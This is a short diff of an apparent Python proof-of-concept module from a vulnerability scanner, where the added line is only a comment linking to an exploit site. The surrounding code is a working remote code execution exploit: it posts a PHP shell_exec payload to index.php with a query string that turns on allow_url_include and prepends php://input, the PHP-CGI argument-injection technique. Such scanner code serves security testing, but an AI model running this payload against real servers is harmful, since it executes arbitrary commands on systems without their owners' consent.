@@ -34,6 +34,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
+            #http://0day5.com/archives/90/
             data = '''<?php echo shell_exec("id"); ?>'''
             request = requests.post('{target}/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input'.format(target=self.target), data=data)
             r = request.text
